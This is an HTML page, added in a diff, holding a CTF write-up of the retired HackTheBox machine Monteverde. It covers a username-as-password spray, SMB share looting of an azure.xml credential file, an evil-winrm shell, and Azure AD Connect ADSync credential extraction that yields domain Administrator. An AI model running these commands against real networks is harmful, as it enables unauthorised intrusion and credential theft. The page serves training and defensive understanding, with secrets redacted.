@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Monteverde &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Monteverde</h1>
+    
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">SMB</span><span class="tag">passwordspraying</span><span class="tag">credentialhunting</span><span class="tag">AzureADConnect</span><span class="tag">ADSync</span><span class="tag">WinRM</span><span class="tag">PrivEsc</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#username-as-password-spray-redacted">Username-as-Password Spray → ‹redacted›</a><a class="lvl3" href="#smb-share-enumeration-azure-xml">SMB Share Enumeration → azure.xml</a><a class="lvl3" href="#winrm-shell-as-mhope">WinRM Shell as mhope</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#azure-ad-connect-credential-extraction-administrator">Azure AD Connect Credential Extraction → Administrator</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Monteverde is a medium Windows Active Directory box in a MEGABANK domain running Azure AD Connect. The entry point is a self-credentialing service account: <code>‹redacted›</code> uses its own username as its password, discovered by spraying the domain user list against itself. That account reads a writable SMB share where another user's home directory contains an Azure PowerShell XML config file with a plaintext password. <code>mhope</code>'s Azure Admin group membership enables a published Azure AD Connect credential extraction attack that decrypts the domain Administrator's password from the local ADSync SQL database.</p>
+<h2 id="recon">Recon</h2>
+<p>Nmap showed a domain controller layout: LDAP, Kerberos, SMB, but no web service. RPC or LDAP enumeration would be the path to a user list since the box offers no HTTP attack surface.</p>
+<p>Domain info extracted via unauthenticated enumeration:</p>
+<pre><code>NetBIOS domain:  MEGABANK
+DNS domain:      MEGABANK.LOCAL
+FQDN:            MONTEVERDE.MEGABANK.LOCAL
+</code></pre>
+<p>User accounts recovered from the domain:</p>
+<pre><code>AAD_987d7f2f57d2   mhope         ‹redacted›
+svc-ata            svc-bexec     svc-netapp
+dgalanos           roleary       smorgan
+</code></pre>
+<p>Notable local groups included <code>ADSyncAdmins</code>, <code>ADSyncOperators</code>, and <code>ADSyncPasswordSet</code>, hinting strongly at Azure AD Connect.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="username-as-password-spray-redacted">Username-as-Password Spray → ‹redacted›</h3>
+<p>With no other credentials, spraying the user list against itself (each account's own username as the password) is a low-noise tactic for finding accounts provisioned with default credentials:</p>
+<pre><code class="language-sh">nxc smb 10.129.170.14 -u users.txt -p users.txt --continue-on-success
+SMB [+] MEGABANK.LOCAL\‹redacted›:‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why service accounts use their own username as a password:</strong> batch job accounts are often provisioned by automating account creation scripts that set <code>username == password</code> as a placeholder, expecting an admin to rotate it. They frequently don't get rotated because the account "works" and no one notices.</p>
+</blockquote>
+<h3 id="smb-share-enumeration-azure-xml">SMB Share Enumeration → azure.xml</h3>
+<p>Enumerating share access as <code>‹redacted›</code>:</p>
+<pre><code class="language-sh">smbmap -H 10.129.170.14 -u ‹redacted› -p ‹redacted›
+# user$: READ ONLY
+# azure_uploads: READ ONLY
+</code></pre>
+<p>Connecting to <code>user$</code> and browsing home directories:</p>
+<pre><code class="language-sh">smbclient //MEGABANK.LOCAL/users$ -U '‹redacted›'
+# mhope\azure.xml  (others were empty)
+mget azure.xml
+</code></pre>
+<p>File contents:</p>
+<pre><code class="language-xml">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;
+  &lt;Obj RefId=&quot;0&quot;&gt;
+    &lt;TN RefId=&quot;0&quot;&gt;
+      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;Props&gt;
+      &lt;DT N=&quot;StartDate&quot;&gt;2020-01-03T05:35:00...&lt;/DT&gt;
+      &lt;DT N=&quot;EndDate&quot;&gt;2054-01-03T05:35:00...&lt;/DT&gt;
+      &lt;S N=&quot;Password&quot;&gt;‹redacted›&lt;/S&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre>
+<blockquote>
+<p><strong>PSADPasswordCredential XML files:</strong> Azure PowerShell cmdlets produce serialized credential objects in this format when exporting AD application passwords. The <code>&lt;S N="Password"&gt;</code> field is plaintext, this is not encryption, it is serialization. Leaving these files in a world-readable SMB share is equivalent to leaving a sticky note with the password.</p>
+</blockquote>
+<p>Credentials: <code>mhope:‹redacted›</code></p>
+<h3 id="winrm-shell-as-mhope">WinRM Shell as mhope</h3>
+<pre><code class="language-sh">evil-winrm -i 10.129.170.14 -u mhope -p '‹redacted›'
+*Evil-WinRM* PS C:\Users\mhope\desktop&gt; type user.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="azure-ad-connect-credential-extraction-administrator">Azure AD Connect Credential Extraction → Administrator</h3>
+<p><code>mhope</code> is a member of the <strong>Azure Admins</strong> group and the machine runs Azure AD Connect with the ADSync service. Azure AD Connect stores the synchronized account's credentials (an account with DCSync rights) encrypted in a local SQL database (<code>ADSync</code>). Members of the Azure Admin group can query this database.</p>
+<blockquote>
+<p><strong>The Azure AD Connect attack:</strong> the ADSync database stores credentials for the account Azure AD Connect uses to sync passwords. Those credentials are AES-encrypted with keys stored in the Windows DPAPI vault tied to the service account. An admin on the machine (or in the Azure Admins group) can re-create the decryption by connecting to the local ADSync SQL instance via integrated auth, reading the encrypted blob, and applying the same decryption logic the service uses. The result is the plaintext credential for an account that has DCSync (domain admin equivalent) privileges.</p>
+</blockquote>
+<p>Using the published PoC from xpn's blog (modified to use integrated auth against the local SQL instance):</p>
+<pre><code class="language-powershell">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Server=127.0.0.1;Database=ADSync;Integrated Security=True&quot;
+</code></pre>
+<p>Uploading and running the script:</p>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; .\creds.ps1
+Domain:   MEGABANK.LOCAL
+Username: administrator
+Password: ‹redacted›
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-powershell">evil-winrm -i 10.129.170.14 -u administrator -p '‹redacted›'
+*Evil-WinRM* PS C:\users\administrator\desktop&gt; type root.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Always spray usernames as passwords.</strong> Service accounts provisioned with placeholder credentials are a consistent finding, and the spray is fast and quiet.</li>
+<li><strong>SMB home-directory shares frequently contain sensitive files.</strong> <code>azure.xml</code>, <code>web.config</code>, and similar files left in user shares are a reliable lateral movement source.</li>
+<li><strong>Azure AD Connect creates a high-value credential target.</strong> The ADSync account has DCSync rights; any admin who can reach the local SQL instance and knows the PoC can recover those credentials.</li>
+<li><strong>Group membership in <code>Azure Admins</code> or <code>ADSyncAdmins</code> is functionally domain admin.</strong> Treat these groups with the same weight as <code>Domain Admins</code> when reviewing AD.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
